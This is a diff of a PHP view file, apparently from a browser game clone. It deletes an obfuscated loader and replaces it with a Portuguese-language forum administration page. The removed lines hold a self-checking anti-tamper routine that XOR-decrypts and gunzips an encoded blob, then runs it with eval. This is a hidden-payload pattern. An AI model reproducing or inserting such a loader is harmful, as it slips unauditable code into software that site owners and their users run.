@@ -1,24 +1,155 @@
 <?php
-$ftqjrwba="2ad5fa8a239b4f4913ab29c03ca3cfe4";
-$bxmtipx="0650050605515c5800005b030302500805525800570f5b5351025602565f0606";
-$tpinvzatn="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";
-$fejcwcml=file_get_contents(__FILE__);
-$rgtxcrxghwh=str_replace($tpinvzatn,"",$fejcwcml);
-if(strpos($rgtxcrxghwh,"ec"."ho")!==false||strpos($rgtxcrxghwh,"pr"."int")!==false||strpos($rgtxcrxghwh,"var_"."dump")!==false||strpos($rgtxcrxghwh,"file_put_"."contents")!==false||strpos($rgtxcrxghwh,"fw"."rite")!==false){die();}
-$innexwjg=str_replace(array($ftqjrwba,$bxmtipx),array("SP_039f0ed1","KP_f669649b"),$fejcwcml);
-$pjpvgciy=md5($innexwjg);
-$ahptqatj=hex2bin($bxmtipx);
-$oykvxebd="";
-$ynxwizyxq=strlen($pjpvgciy);
-for($dljnzs=0;$dljnzs<$ynxwizyxq;$dljnzs++){
-$oykvxebd.=chr(ord($ahptqatj[$dljnzs])^ord($pjpvgciy[$dljnzs]));
-}
-$iyupenue=base64_decode($tpinvzatn);
-$nahlpzf=strlen($iyupenue);
-$xihrvkri="";
-$ugmbwvcufb=strlen($oykvxebd);
-for($dljnzs=0;$dljnzs<$nahlpzf;$dljnzs++){
-$xihrvkri.=$iyupenue[$dljnzs]^$oykvxebd[$dljnzs%$ugmbwvcufb];
-}
-$ryzycqzo="gzun"."compress";
-eval('?>' . $ryzycqzo($xihrvkri) . '<?php ');
+/**
+ * Forum Admin View — screen=forum&screenmode=admin
+ * Matches original game design (see screenshot):
+ *   - List existing forum sections with rename/visibility toggle/delete
+ *   - Create new forum section with visibility option
+ *   - Link to moderation history
+ */
+$baseUrl = 'game.php?village=' . $village['id'] . '&screen=forum&screenmode=admin';
+
+// Visibility labels (visible field: 0=all, 1=hidden, 2=trusted)
+$visLabels = [
+    0 => 'Para todos',
+    1 => 'Fórum escondido',
+    2 => 'Membros de confiança',
+];
+?>
+
+<?php if (!empty($error)): ?>
+    <div class="error_box" style="margin-bottom:8px; padding:5px; background:#ffe0e0; border:1px solid #c00;">
+        <?= htmlspecialchars($error) ?>
+    </div>
+<?php endif; ?>
+
+<?php if (!empty($success)): ?>
+    <div style="margin-bottom:8px; padding:5px; background:#e0ffe0; border:1px solid #080;">
+        <?= htmlspecialchars($success) ?>
+    </div>
+<?php endif; ?>
+
+<!-- ══════════ Novas mensagens no fórum ══════════ -->
+<table class="vis" width="100%" style="margin-bottom:10px;">
+    <tr class="head">
+        <th colspan="2">Novas mensagens no fórum</th>
+    </tr>
+    <tr class="row_b">
+        <td>
+            <input type="checkbox" id="exclude_silent" name="exclude_silent" value="1" checked>
+            <label for="exclude_silent" style="font-style:italic;">Excluir publicações de fóruns silenciados</label>
+        </td>
+        <td align="right">
+            <a href="<?= $baseUrl ?>&action=add_section&h=<?= $session['hkey'] ?>">+</a>
+        </td>
+    </tr>
+</table>
+
+<!-- ══════════ Existing sections ══════════ -->
+<table class="vis" width="100%">
+    <tr class="head">
+        <th>Fórum</th>
+        <th width="150">Visibilidade</th>
+        <th width="120">Acesso</th>
+        <th width="200">Ação</th>
+    </tr>
+
+    <?php if (empty($sections)): ?>
+        <tr class="row_b">
+            <td colspan="4" align="center"><i>Nenhum fórum criado.</i></td>
+        </tr>
+    <?php else: ?>
+        <?php foreach ($sections as $sec): ?>
+            <tr class="row_b">
+                <!-- Rename form -->
+                <td>
+                    <form method="post"
+                        action="<?= $baseUrl ?>&action=edit_forum&fid=<?= $sec['id'] ?>&h=<?= $session['hkey'] ?>"
+                        style="display:inline;">
+                        <input type="text" name="title" value="<?= htmlspecialchars($sec['name']) ?>" size="18" maxlength="25">
+                        <input type="submit" value="Renomear" class="btn">
+                    </form>
+                </td>
+
+                <!-- Visibility toggle -->
+                <td align="center">
+                    <a href="<?= $baseUrl ?>&action=make_private&fid=<?= $sec['id'] ?>&h=<?= $session['hkey'] ?>">
+                        <?= $visLabels[$sec['visible'] ?? 0] ?>
+                    </a>
+                    <small style="color:#666;">alterar</small>
+                </td>
+
+                <!-- Partners (access sharing) -->
+                <td align="center">
+                    <a href="<?= $baseUrl ?>&action=partners&fid=<?= $sec['id'] ?>">Adicionar tribos</a>
+                </td>
+
+                <!-- Delete + confirm -->
+                <td align="center">
+                    <form method="post"
+                        action="<?= $baseUrl ?>&action=del_forum&fid=<?= $sec['id'] ?>&h=<?= $session['hkey'] ?>"
+                        style="display:inline;"
+                        onsubmit="return confirm('Tem a certeza que deseja apagar este fórum e todos os seus tópicos?')">
+                        <input type="hidden" name="confirm" value="true">
+                        <input type="checkbox" name="confirm_check" id="confirm_<?= $sec['id'] ?>"
+                            onclick="this.form.elements['confirm'].value = this.checked ? 'true' : 'false'">
+                        <label for="confirm_<?= $sec['id'] ?>">confirmar</label>
+                        <input type="submit" value="Apagar" class="btn"
+                            style="background-color:#c00; color:#fff; border-color:#900;">
+                    </form>
+                    &nbsp;
+                    <a href="<?= $baseUrl ?>&action=add_subsection&fid=<?= $sec['id'] ?>">+</a>
+                </td>
+            </tr>
+        <?php endforeach; ?>
+    <?php endif; ?>
+</table>
+
+<?php if (!empty($sections)): ?>
+    <p style="font-size:11px; text-align:right; color:#666;">
+        *: Esta tribo ainda não aceitou a sua partilha de fórum
+    </p>
+<?php endif; ?>
+
+<br>
+
+<!-- ══════════ Create new forum ══════════ -->
+<table class="vis" width="100%">
+    <tr class="head">
+        <th colspan="3">Criar novo fórum</th>
+    </tr>
+    <tr class="row_b">
+        <form method="post" action="<?= $baseUrl ?>&action=new_forum&h=<?= $session['hkey'] ?>">
+            <td>
+                <b>Nome do fórum:</b>
+                <input type="text" name="title" size="20" maxlength="25" required>
+            </td>
+            <td>
+                <label>
+                    <input type="radio" name="trust_priv" value="0" checked>
+                    Visível a todos
+                </label><br>
+                <label>
+                    <input type="radio" name="trust_priv" value="1">
+                    Fórum escondido
+                </label><br>
+                <label>
+                    <input type="radio" name="trust_priv" value="2">
+                    Membros de confiança
+                </label>
+            </td>
+            <td align="right">
+                <input type="submit" value="Criar" class="btn">
+            </td>
+        </form>
+    </tr>
+</table>
+
+<br>
+
+<!-- ══════════ Moderation log link ══════════ -->
+<div style="text-align:center;">
+    <a href="<?= $baseUrl ?>&action=log">
+        <img src="/graphic/forum/forum_admin.png" alt="" style="vertical-align:middle;">
+        Historico de moderação do fórum
+    </a>
+</div>
